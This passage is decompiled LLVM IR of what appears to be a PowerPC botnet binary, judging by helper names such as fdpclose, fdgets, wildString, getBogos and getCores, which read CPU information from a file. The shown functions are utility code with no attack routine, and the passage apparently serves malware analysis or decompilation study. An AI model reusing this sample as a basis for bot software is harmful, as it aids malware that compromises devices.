dec_label_pc_100014f4:                            ; preds = %dec_label_pc_100014c8
  store i32 268440840, i32* @lr, align 4
  %v1_10001504 = call i32 @__libc_close(i32 %v3_100014dc)
  br label %dec_label_pc_10001508

dec_label_pc_10001508:                            ; preds = %dec_label_pc_100014dc, %dec_label_pc_100014f4
  %stack_var_-36.0 = phi i32 [ %v3_100014dc, %dec_label_pc_100014dc ], [ %tmp3, %dec_label_pc_100014f4 ]
  %v1_1000150c = mul i32 %stack_var_-36.0, 4
  %v3_10001518 = load i32, i32* @global_var_1002e608.16, align 4
  %v2_1000151c = add i32 %v3_10001518, %v1_1000150c
  %v2_10001524 = inttoptr i32 %v2_1000151c to i32*
  store i32 %v0_100013c0, i32* %v2_10001524, align 4
  br label %dec_label_pc_10001530

dec_label_pc_10001530:                            ; preds = %dec_label_pc_100013f4, %dec_label_pc_10001390, %dec_label_pc_10001358, %dec_label_pc_10001324, %dec_label_pc_10001300, %dec_label_pc_10001508
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_10001390 ], [ -1, %dec_label_pc_100013f4 ], [ %stack_var_-36.0, %dec_label_pc_10001508 ], [ -1, %dec_label_pc_10001358 ], [ -1, %dec_label_pc_10001324 ], [ -1, %dec_label_pc_10001300 ]
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32 %v3_100014dc, { 1, 0 }
  uselistorder i32 %v1_10001368, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_10001530, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10001508, { 1, 0 }
  uselistorder label %dec_label_pc_100014c8, { 1, 0 }
  uselistorder label %dec_label_pc_10001498, { 1, 0 }
  uselistorder label %dec_label_pc_1000148c, { 1, 0 }
  uselistorder label %dec_label_pc_10001454, { 1, 0 }
  uselistorder label %dec_label_pc_100013c0, { 1, 0 }
  uselistorder label %dec_label_pc_10001300, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-308 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %v3_1000156c = load i32, i32* @global_var_1002e608.16, align 4
  %v3_10001570 = icmp eq i32 %v3_1000156c, 0
  br i1 %v3_10001570, label %dec_label_pc_1000159c, label %dec_label_pc_10001578

dec_label_pc_10001578:                            ; preds = %entry
  %v1_1000157c = mul i32 %arg1, 4
  %v2_1000158c = add i32 %v3_1000156c, %v1_1000157c
  %v1_10001590 = inttoptr i32 %v2_1000158c to i32*
  %v2_10001590 = load i32, i32* %v1_10001590, align 4
  %v3_10001594 = icmp eq i32 %v2_10001590, 0
  br i1 %v3_10001594, label %dec_label_pc_1000159c, label %dec_label_pc_100015a8

dec_label_pc_1000159c:                            ; preds = %dec_label_pc_10001578, %entry
  br label %dec_label_pc_100016d0

dec_label_pc_100015a8:                            ; preds = %dec_label_pc_10001578
  store i32 268441008, i32* @lr, align 4
  %v1_100015ac = call i32 @__libc_close(i32 %arg1)
  %v2_100015b0 = ptrtoint i32* %stack_var_-180 to i32
  store i32 268441020, i32* @lr, align 4
  %v1_100015b8 = call i32 @sigemptyset(i32 %v2_100015b0)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441036, i32* @lr, align 4
  %v2_100015c8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 2)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441052, i32* @lr, align 4
  %v2_100015d8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 3)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441068, i32* @lr, align 4
  %v2_100015e8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 1)
  %v2_100015f0 = ptrtoint i32* %stack_var_-308 to i32
  store i32 268441092, i32* @lr, align 4
  %v3_10001600 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_100015b0, i32 %v2_100015f0)
  %v2_10001620 = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_10001604

dec_label_pc_10001604:                            ; preds = %dec_label_pc_1000164c, %dec_label_pc_100015a8
  %v3_10001614 = load i32, i32* @global_var_1002e608.16, align 4
  %v2_10001618 = add i32 %v3_10001614, %v1_1000157c
  %v1_1000161c = inttoptr i32 %v2_10001618 to i32*
  %v2_1000161c = load i32, i32* %v1_1000161c, align 4
  store i32 268441140, i32* @lr, align 4
  %v3_10001630 = call i32 @__libc_waitpid(i32 %v2_1000161c, i32 %v2_10001620, i32 0)
  %v4_10001644 = icmp eq i32 %v3_10001630, -1
  br i1 %v4_10001644, label %dec_label_pc_1000164c, label %dec_label_pc_10001660

dec_label_pc_1000164c:                            ; preds = %dec_label_pc_10001604
  %v0_1000164c = call i32 @__errno_location()
  %v1_10001654 = inttoptr i32 %v0_1000164c to i32*
  %v2_10001654 = load i32, i32* %v1_10001654, align 4
  %v3_10001658 = icmp eq i32 %v2_10001654, 4
  br i1 %v3_10001658, label %dec_label_pc_10001604, label %dec_label_pc_10001660

dec_label_pc_10001660:                            ; preds = %dec_label_pc_10001604, %dec_label_pc_1000164c
  %v4_10001644.lcssa = phi i1 [ false, %dec_label_pc_10001604 ], [ true, %dec_label_pc_1000164c ]
  store i32 268441204, i32* @lr, align 4
  %v3_10001670 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_100015f0, i32 0)
  %v1_10001678 = mul i32 %tmp5, 4
  %v3_10001684 = load i32, i32* @global_var_1002e608.16, align 4
  %v2_10001688 = add i32 %v3_10001684, %v1_10001678
  %v2_10001690 = inttoptr i32 %v2_10001688 to i32*
  store i32 0, i32* %v2_10001690, align 4
  br i1 %v4_10001644.lcssa, label %dec_label_pc_100016c8, label %dec_label_pc_100016a4

dec_label_pc_100016a4:                            ; preds = %dec_label_pc_10001660
  %v3_100016a4 = load i32, i32* %stack_var_-52, align 4
  %v1_100016b0 = call i32 @__asm_rlwinm(i32 %v3_100016a4, i32 0, i32 16, i32 23)
  %v4_100016b4 = sdiv i32 %v1_100016b0, 256
  br label %dec_label_pc_100016c8

dec_label_pc_100016c8:                            ; preds = %dec_label_pc_10001660, %dec_label_pc_100016a4
  %storemerge2 = phi i32 [ %v4_100016b4, %dec_label_pc_100016a4 ], [ -1, %dec_label_pc_10001660 ]
  br label %dec_label_pc_100016d0

dec_label_pc_100016d0:                            ; preds = %dec_label_pc_1000159c, %dec_label_pc_100016c8
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_100016c8 ], [ -1, %dec_label_pc_1000159c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_100015b0, { 0, 2, 1, 4, 3, 6, 5, 7 }
  uselistorder i32 %v1_1000157c, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100016d0, { 1, 0 }
  uselistorder label %dec_label_pc_100016c8, { 1, 0 }
  uselistorder label %dec_label_pc_10001660, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_10001764

dec_label_pc_10001724:                            ; preds = %dec_label_pc_10001774
  store i32 268441412, i32* @lr, align 4
  %v1_10001740 = call i32 @__libc_read(i32 %arg3)
  %v1_10001750 = add nuw i32 %storemerge25, 1
  %v3_1000175c = icmp eq i32 %v1_10001740, 1
  br i1 %v3_1000175c, label %dec_label_pc_10001764, label %dec_label_pc_10001798

dec_label_pc_10001764:                            ; preds = %entry, %dec_label_pc_10001724
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_10001750, %dec_label_pc_10001724 ]
  %v2_1000176c = icmp slt i32 %storemerge25, %arg2
  br i1 %v2_1000176c, label %dec_label_pc_10001774, label %dec_label_pc_10001798

dec_label_pc_10001774:                            ; preds = %dec_label_pc_10001764
  %v2_10001780 = add i32 %storemerge25, %arg1
  %v1_10001784 = add i32 %v2_10001780, -1
  %v1_10001788 = inttoptr i32 %v1_10001784 to i8*
  %v2_10001788 = load i8, i8* %v1_10001788, align 1
  %v3_10001790 = icmp eq i8 %v2_10001788, 10
  br i1 %v3_10001790, label %dec_label_pc_10001798, label %dec_label_pc_10001724

dec_label_pc_10001798:                            ; preds = %dec_label_pc_10001774, %dec_label_pc_10001764, %dec_label_pc_10001724
  %stack_var_-36.0.lcssa = phi i32 [ 1, %dec_label_pc_10001774 ], [ 1, %dec_label_pc_10001764 ], [ %v1_10001740, %dec_label_pc_10001724 ]
  %v3_1000179c = icmp eq i32 %stack_var_-36.0.lcssa, 0
  %storemerge = select i1 %v3_1000179c, i32 0, i32 %arg1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10001740, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10001764, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_100018343 = load i8, i8* %arg1, align 1
  %v3_1000183c6 = icmp eq i8 %v2_100018343, 0
  br i1 %v3_1000183c6, label %dec_label_pc_10001850, label %dec_label_pc_10001844

dec_label_pc_100017f4:                            ; preds = %dec_label_pc_10001844
  %v1_100017f8 = mul i32 %stack_var_-40.07, 16
  %v2_10001800 = load i8, i8* %stack_var_-24.08, align 1
  %v3_10001800 = zext i8 %v2_10001800 to i32
  %v1_10001810 = mul nuw nsw i32 %v3_10001800, 4
  %v2_10001814 = add i32 %v1_10001810, ptrtoint (i32* @global_var_100138a0.25 to i32)
  %v1_10001818 = inttoptr i32 %v2_10001814 to i32*
  %v2_10001818 = load i32, i32* %v1_10001818, align 4
  %v2_1000181c = or i32 %v2_10001818, %v1_100017f8
  %v1_10001828 = add i32 %v4_100018309, 1
  %v5_1000182c = inttoptr i32 %v1_10001828 to i8*
  %v2_10001834 = load i8, i8* %v5_1000182c, align 1
  %v3_1000183c = icmp eq i8 %v2_10001834, 0
  br i1 %v3_1000183c, label %dec_label_pc_10001850, label %dec_label_pc_10001844

dec_label_pc_10001844:                            ; preds = %entry, %dec_label_pc_100017f4
  %v4_100018309 = phi i32 [ %v1_10001828, %dec_label_pc_100017f4 ], [ %tmp, %entry ]
  %stack_var_-24.08 = phi i8* [ %v5_1000182c, %dec_label_pc_100017f4 ], [ %arg1, %entry ]
  %stack_var_-40.07 = phi i32 [ %v2_1000181c, %dec_label_pc_100017f4 ], [ 0, %entry ]
  %tmp17 = icmp sgt i32 %stack_var_-40.07, -1
  br i1 %tmp17, label %dec_label_pc_100017f4, label %dec_label_pc_10001850

dec_label_pc_10001850:                            ; preds = %dec_label_pc_100017f4, %dec_label_pc_10001844, %entry
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v2_1000181c, %dec_label_pc_100017f4 ], [ %stack_var_-40.07, %dec_label_pc_10001844 ]
  ret i32 %stack_var_-40.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-40.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001850, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001844, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %v2_1000188c = load i8, i8* %arg1, align 1
  %v3_1000189c = icmp eq i8 %v2_1000188c, 42
  br i1 %v3_1000189c, label %dec_label_pc_100018d4, label %dec_label_pc_100018a4

dec_label_pc_100018a4:                            ; preds = %entry
  %v3_100018a8 = icmp eq i8 %v2_1000188c, 63
  br i1 %v3_100018a8, label %dec_label_pc_10001948, label %dec_label_pc_100018b0

dec_label_pc_100018b0:                            ; preds = %dec_label_pc_100018a4
  %v3_100018b4 = icmp eq i8 %v2_1000188c, 0
  br i1 %v3_100018b4, label %dec_label_pc_100018c0, label %dec_label_pc_100019a4

dec_label_pc_100018c0:                            ; preds = %dec_label_pc_100018b0
  %v2_100018c4 = load i8, i8* %tmp, align 1
  %v3_100018c4 = zext i8 %v2_100018c4 to i32
  br label %dec_label_pc_10001a28

dec_label_pc_100018d4:                            ; preds = %entry
  %v2_100018d8 = add i32 %tmp8, 1
  store i32 268441832, i32* @lr, align 4
  %v5_100018e4 = inttoptr i32 %v2_100018d8 to i8*
  %v6_100018e4 = call i32 @wildString(i8* %v5_100018e4, i32 %arg2, i32 %tmp8)
  %v3_100018ec = icmp eq i32 %v6_100018e4, 0
  br i1 %v3_100018ec, label %dec_label_pc_10001934, label %dec_label_pc_100018f4

dec_label_pc_100018f4:                            ; preds = %dec_label_pc_100018d4
  %v2_100018f8 = load i8, i8* %tmp, align 1
  %v3_10001900 = icmp eq i8 %v2_100018f8, 0
  br i1 %v3_10001900, label %dec_label_pc_1000193c, label %dec_label_pc_10001908

dec_label_pc_10001908:                            ; preds = %dec_label_pc_100018f4
  %v2_1000190c = add i32 %arg2, 1
  store i32 268441884, i32* @lr, align 4
  %v6_10001918 = call i32 @wildString(i8* nonnull %arg1, i32 %v2_1000190c, i32 %arg2)
  %v3_10001920 = icmp eq i32 %v6_10001918, 0
  br i1 %v3_10001920, label %dec_label_pc_10001934, label %dec_label_pc_1000193c

dec_label_pc_10001934:                            ; preds = %dec_label_pc_10001908, %dec_label_pc_100018d4
  br label %dec_label_pc_1000193c

dec_label_pc_1000193c:                            ; preds = %dec_label_pc_100018f4, %dec_label_pc_10001908, %dec_label_pc_10001934
  %storemerge3 = phi i32 [ 0, %dec_label_pc_10001934 ], [ 1, %dec_label_pc_10001908 ], [ 1, %dec_label_pc_100018f4 ]
  br label %dec_label_pc_10001a28

dec_label_pc_10001948:                            ; preds = %dec_label_pc_100018a4
  %v2_1000194c = load i8, i8* %tmp, align 1
  %v3_10001954 = icmp eq i8 %v2_1000194c, 0
  br i1 %v3_10001954, label %dec_label_pc_10001998, label %dec_label_pc_1000195c

dec_label_pc_1000195c:                            ; preds = %dec_label_pc_10001948
  %v1_10001960 = add i32 %tmp8, 1
  %v2_10001968 = add i32 %arg2, 1
  store i32 268441976, i32* @lr, align 4
  %v4_10001974 = inttoptr i32 %v1_10001960 to i8*
  %v5_10001974 = call i32 @wildString(i8* %v4_10001974, i32 %v2_10001968, i32 %arg2)
  %v3_1000197c = icmp ne i32 %v5_10001974, 0
  %. = zext i1 %v3_1000197c to i32
  br label %dec_label_pc_10001998

dec_label_pc_10001998:                            ; preds = %dec_label_pc_1000195c, %dec_label_pc_10001948
  %storemerge2 = phi i32 [ 1, %dec_label_pc_10001948 ], [ %., %dec_label_pc_1000195c ]
  br label %dec_label_pc_10001a28

dec_label_pc_100019a4:                            ; preds = %dec_label_pc_100018b0
  %v3_100019a8 = load i8, i8* %arg1, align 1
  %v4_100019a8 = zext i8 %v3_100019a8 to i32
  store i32 268442044, i32* @lr, align 4
  %v3_100019b8 = call i32 @__GI_toupper(i32 %v4_100019a8, i32 %tmp8)
  %v3_100019c4 = load i8, i8* %tmp, align 1
  %v4_100019c4 = zext i8 %v3_100019c4 to i32
  store i32 268442072, i32* @lr, align 4
  %v3_100019d4 = call i32 @__GI_toupper(i32 %v4_100019c4, i32 %arg2)
  %v4_100019dc = icmp eq i32 %v3_100019b8, %v3_100019d4
  br i1 %v4_100019dc, label %dec_label_pc_100019e4, label %dec_label_pc_10001a20

dec_label_pc_100019e4:                            ; preds = %dec_label_pc_100019a4
  %v1_100019e8 = add i32 %tmp8, 1
  %v2_100019f0 = add i32 %arg2, 1
  store i32 268442112, i32* @lr, align 4
  %v4_100019fc = inttoptr i32 %v1_100019e8 to i8*
  %v5_100019fc = call i32 @wildString(i8* %v4_100019fc, i32 %v2_100019f0, i32 %arg2)
  %v3_10001a04 = icmp ne i32 %v5_100019fc, 0
  %.7 = zext i1 %v3_10001a04 to i32
  br label %dec_label_pc_10001a20

dec_label_pc_10001a20:                            ; preds = %dec_label_pc_100019e4, %dec_label_pc_100019a4
  %storemerge = phi i32 [ 1, %dec_label_pc_100019a4 ], [ %.7, %dec_label_pc_100019e4 ]
  br label %dec_label_pc_10001a28

dec_label_pc_10001a28:                            ; preds = %dec_label_pc_10001998, %dec_label_pc_1000193c, %dec_label_pc_100018c0, %dec_label_pc_10001a20
  %stack_var_-36.0 = phi i32 [ %storemerge3, %dec_label_pc_1000193c ], [ %storemerge2, %dec_label_pc_10001998 ], [ %v3_100018c4, %dec_label_pc_100018c0 ], [ %storemerge, %dec_label_pc_10001a20 ]
  ret i32 %stack_var_-36.0

; uselistorder directives
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 5, 6, 7, 3, 4, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_10001a28, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000193c, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 268442228, i32* @lr, align 4
  %v1_10001a70 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_10001a70, i32* %arg2, align 4
  %v4_10001a8c = icmp eq i32 %v1_10001a70, -1
  %. = zext i1 %v4_10001a8c to i32
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_10001b1c2 = load i8, i8* %arg1, align 1
  %v3_10001b245 = icmp eq i8 %v2_10001b1c2, 0
  br i1 %v3_10001b245, label %dec_label_pc_10001b2c, label %dec_label_pc_10001ae4

dec_label_pc_10001ae4:                            ; preds = %entry, %dec_label_pc_10001ae4
  %storemerge7 = phi i8* [ %storemerge, %dec_label_pc_10001ae4 ], [ %arg1, %entry ]
  %storemerge.in6 = phi i32 [ %v1_10001b10, %dec_label_pc_10001ae4 ], [ %tmp, %entry ]
  %v3_10001ae8 = load i8, i8* %storemerge7, align 1
  %v4_10001ae8 = zext i8 %v3_10001ae8 to i32
  store i32 %v4_10001ae8, i32* %r3.global-to-local, align 4
  store i32 268442364, i32* @lr, align 4
  %v3_10001af8 = call i32 @__GI_toupper(i32 %v4_10001ae8, i32 %storemerge.in6)
  store i32 %v3_10001af8, i32* %r3.global-to-local, align 4
  %v1_10001b08 = trunc i32 %v3_10001af8 to i8
  store i8 %v1_10001b08, i8* %storemerge7, align 1
  %v1_10001b10 = add i32 %storemerge.in6, 1
  %storemerge = inttoptr i32 %v1_10001b10 to i8*
  %v2_10001b1c = load i8, i8* %storemerge, align 1
  %v3_10001b24 = icmp eq i8 %v2_10001b1c, 0
  br i1 %v3_10001b24, label %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge, label %dec_label_pc_10001ae4

dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge: ; preds = %dec_label_pc_10001ae4
  %v0_10001b40.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001b2c

dec_label_pc_10001b2c:                            ; preds = %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge, %entry
  %v0_10001b40 = phi i32 [ %v0_10001b40.pre, %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge ], [ %tmp, %entry ]
  ret i32 %v0_10001b40

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_10001b10, { 1, 0 }
  uselistorder i32 %storemerge.in6, { 1, 0 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10001ae4, { 1, 0 }
}

define i32 @getBogos(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-4128 = alloca i32, align 4
  store i32 268442480, i32* @lr, align 4
  %v3_10001b6c = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_10013ca0.26 to i32), i32 0)
  %v2_10001d0c = ptrtoint i32* %stack_var_-4128 to i32
  %v1_10001b84 = bitcast i32* %stack_var_-4128 to i8*
  br label %dec_label_pc_10001d0c

dec_label_pc_10001b7c:                            ; preds = %dec_label_pc_10001d0c
  store i32 268442504, i32* @lr, align 4
  %v2_10001b84 = call i32 @uppercase(i8* %v1_10001b84)
  store i32 268442524, i32* @lr, align 4
  %v5_10001b98 = call i32 @strstr(i32 %v2_10001d0c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10013cb0.27, i32 0, i32 0), i32 ptrtoint (i32* @global_var_10010000.9 to i32))
  %v4_10001ba8 = icmp eq i32 %v5_10001b98, %v2_10001d0c
  br i1 %v4_10001ba8, label %dec_label_pc_10001bb0, label %dec_label_pc_10001cf4

dec_label_pc_10001bb0:                            ; preds = %dec_label_pc_10001b7c
  %tmp15 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_10001bcc

dec_label_pc_10001bc0:                            ; preds = %dec_label_pc_10001bf4, %dec_label_pc_10001be0, %dec_label_pc_10001bcc
  %v1_10001bc4 = add i32 %v4_10001bcc, 1
  %v5_10001bc8 = inttoptr i32 %v1_10001bc4 to i8*
  br label %dec_label_pc_10001bcc

dec_label_pc_10001bcc:                            ; preds = %dec_label_pc_10001bb0, %dec_label_pc_10001bc0
  %storemerge2 = phi i8* [ %v5_10001bc8, %dec_label_pc_10001bc0 ], [ %tmp15, %dec_label_pc_10001bb0 ]
  %v4_10001bcc = ptrtoint i8* %storemerge2 to i32
  %v2_10001bd0 = load i8, i8* %storemerge2, align 1
  %v3_10001bd8 = icmp eq i8 %v2_10001bd0, 32
  br i1 %v3_10001bd8, label %dec_label_pc_10001bc0, label %dec_label_pc_10001be0

dec_label_pc_10001be0:                            ; preds = %dec_label_pc_10001bcc
  %v2_10001be4 = load i8, i8* %storemerge2, align 1
  %v3_10001bec = icmp eq i8 %v2_10001be4, 9
  br i1 %v3_10001bec, label %dec_label_pc_10001bc0, label %dec_label_pc_10001bf4

dec_label_pc_10001bf4:                            ; preds = %dec_label_pc_10001be0
  %v2_10001bf8 = load i8, i8* %storemerge2, align 1
  %v3_10001c00 = icmp eq i8 %v2_10001bf8, 58
  br i1 %v3_10001c00, label %dec_label_pc_10001bc0, label %dec_label_pc_10001c34.preheader

dec_label_pc_10001c34.preheader:                  ; preds = %dec_label_pc_10001bf4
  %v2_10001c4c = add i32 %v4_10001bcc, -1
  br label %dec_label_pc_10001c34

dec_label_pc_10001c0c:                            ; preds = %dec_label_pc_10001c64, %dec_label_pc_10001c34
  store i32 %v4_10001bcc, i32* @r3, align 4
  %v0_10001c14 = call i32 @__GI_strlen()
  %v1_10001c28 = add i32 %v0_10001c14, %v2_10001c4c
  %v3_10001c30 = inttoptr i32 %v1_10001c28 to i8*
  store i8 0, i8* %v3_10001c30, align 1
  br label %dec_label_pc_10001c34

dec_label_pc_10001c34:                            ; preds = %dec_label_pc_10001c34.preheader, %dec_label_pc_10001c0c
  store i32 %v4_10001bcc, i32* @r3, align 4
  %v0_10001c3c = call i32 @__GI_strlen()
  %v1_10001c50 = add i32 %v0_10001c3c, %v2_10001c4c
  %v1_10001c54 = inttoptr i32 %v1_10001c50 to i8*
  %v2_10001c54 = load i8, i8* %v1_10001c54, align 1
  %v3_10001c5c = icmp eq i8 %v2_10001c54, 13
  br i1 %v3_10001c5c, label %dec_label_pc_10001c0c, label %dec_label_pc_10001c64

dec_label_pc_10001c64:                            ; preds = %dec_label_pc_10001c34
  store i32 %v4_10001bcc, i32* @r3, align 4
  %v0_10001c6c = call i32 @__GI_strlen()
  %v1_10001c80 = add i32 %v0_10001c6c, %v2_10001c4c
  %v1_10001c84 = inttoptr i32 %v1_10001c80 to i8*
  %v2_10001c84 = load i8, i8* %v1_10001c84, align 1
  %v3_10001c8c = icmp eq i8 %v2_10001c84, 10
  br i1 %v3_10001c8c, label %dec_label_pc_10001c0c, label %dec_label_pc_10001c94

dec_label_pc_10001c94:                            ; preds = %dec_label_pc_10001c64
  store i32 %v4_10001bcc, i32* @r3, align 4
  store i32 268442788, i32* @lr, align 4
  %v2_10001ca0 = call i32 @__GI_strchr(i32 %v4_10001bcc, i32 46)
  %v3_10001ca8 = icmp eq i32 %v2_10001ca0, 0
  br i1 %v3_10001ca8, label %dec_label_pc_10001ccc, label %dec_label_pc_10001cb0

dec_label_pc_10001cb0:                            ; preds = %dec_label_pc_10001c94
  store i32 %v4_10001bcc, i32* @r3, align 4
  store i32 268442816, i32* @lr, align 4
  %v2_10001cbc = call i32 @__GI_strchr(i32 %v4_10001bcc, i32 46)
  %v3_10001cc8 = inttoptr i32 %v2_10001cbc to i8*
  store i8 0, i8* %v3_10001cc8, align 1
  br label %dec_label_pc_10001ccc

dec_label_pc_10001ccc:                            ; preds = %dec_label_pc_10001c94, %dec_label_pc_10001cb0
  %v3_10001cdc = call i32 @strcpy(i32 %arg1, i8* %storemerge2)
  store i32 ptrtoint (i32* @global_var_10001ce8.28 to i32), i32* @lr, align 4
  %v1_10001ce4 = call i32 @__libc_close(i32 %v3_10001b6c)
  br label %dec_label_pc_10001d3c

dec_label_pc_10001cf4:                            ; preds = %dec_label_pc_10001b7c
  store i32 268442892, i32* @lr, align 4
  %v3_10001d08 = call i32 @__GI_memset(i32 %v2_10001d0c, i32 0, i32 4096)
  br label %dec_label_pc_10001d0c

dec_label_pc_10001d0c:                            ; preds = %entry, %dec_label_pc_10001cf4
  %v3_10001d1c = call i32 @fdgets(i32 %v2_10001d0c, i32 4096, i32 %v3_10001b6c)
  %v3_10001d24 = icmp eq i32 %v3_10001d1c, 0
  br i1 %v3_10001d24, label %dec_label_pc_10001d2c, label %dec_label_pc_10001b7c

dec_label_pc_10001d2c:                            ; preds = %dec_label_pc_10001d0c
  store i32 ptrtoint (i32* @global_var_10001d34.29 to i32), i32* @lr, align 4
  %v1_10001d30 = call i32 @__libc_close(i32 %v3_10001b6c)
  br label %dec_label_pc_10001d3c

dec_label_pc_10001d3c:                            ; preds = %dec_label_pc_10001ccc, %dec_label_pc_10001d2c
  %storemerge = phi i32 [ 1, %dec_label_pc_10001d2c ], [ 0, %dec_label_pc_10001ccc ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_10001bcc, { 1, 0, 3, 2, 4, 7, 5, 6, 8 }
  uselistorder i8* %storemerge2, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_10001d0c, { 3, 0, 1, 2 }
  uselistorder i32 %v3_10001b6c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001d3c, { 1, 0 }
  uselistorder label %dec_label_pc_10001d0c, { 1, 0 }
  uselistorder label %dec_label_pc_10001ccc, { 1, 0 }
  uselistorder label %dec_label_pc_10001c34, { 1, 0 }
  uselistorder label %dec_label_pc_10001bcc, { 1, 0 }
}

define i32 @getCores() local_unnamed_addr {
entry:
  %stack_var_-4112 = alloca i32, align 4
  store i32 268443020, i32* @lr, align 4
  %v3_10001d88 = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_10013ca0.26 to i32), i32 0)
  %v2_10001dec = ptrtoint i32* %stack_var_-4112 to i32
  %v1_10001da0 = bitcast i32* %stack_var_-4112 to i8*
  br label %dec_label_pc_10001dec

dec_label_pc_10001d98:                            ; preds = %dec_label_pc_10001dec
  store i32 268443044, i32* @lr, align 4
  %v2_10001da0 = call i32 @uppercase(i8* %v1_10001da0)
  store i32 268443064, i32* @lr, align 4
  %v5_10001db4 = call i32 @strstr(i32 %v2_10001dec, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10013cb0.27, i32 0, i32 0), i32 ptrtoint (i32* @global_var_10010000.9 to i32))
  %v4_10001dc0 = icmp eq i32 %v5_10001db4, %v2_10001dec
  br i1 %v4_10001dc0, label %dec_label_pc_10001dc8, label %dec_label_pc_10001dd4

dec_label_pc_10001dc8:                            ; preds = %dec_label_pc_10001d98
  %v1_10001dcc = add i32 %stack_var_-4116.1, 1
  br label %dec_label_pc_10001dd4

dec_label_pc_10001dd4:                            ; preds = %dec_label_pc_10001d98, %dec_label_pc_10001dc8
  %stack_var_-4116.0 = phi i32 [ %v1_10001dcc, %dec_label_pc_10001dc8 ], [ %stack_var_-4116.1, %dec_label_pc_10001d98 ]
  store i32 268443116, i32* @lr, align 4
  %v3_10001de8 = call i32 @__GI_memset(i32 %v2_10001dec, i32 0, i32 4096)
  br label %dec_label_pc_10001dec

dec_label_pc_10001dec:                            ; preds = %entry, %dec_label_pc_10001dd4
  %stack_var_-4116.1 = phi i32 [ 0, %entry ], [ %stack_var_-4116.0, %dec_label_pc_10001dd4 ]
  %v3_10001dfc = call i32 @fdgets(i32 %v2_10001dec, i32 4096, i32 %v3_10001d88)
  %v3_10001e04 = icmp eq i32 %v3_10001dfc, 0
  br i1 %v3_10001e04, label %dec_label_pc_10001e0c, label %dec_label_pc_10001d98

dec_label_pc_10001e0c:                            ; preds = %dec_label_pc_10001dec
  store i32 268443156, i32* @lr, align 4
  %v1_10001e10 = call i32 @__libc_close(i32 %v3_10001d88)
  ret i32 %stack_var_-4116.1

; uselistorder directives
  uselistorder i32 %stack_var_-4116.1, { 0, 2, 1 }
  uselistorder i32 %v2_10001dec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10001dec, { 1, 0 }
  uselistorder label %dec_label_pc_10001dd4, { 1, 0 }
}

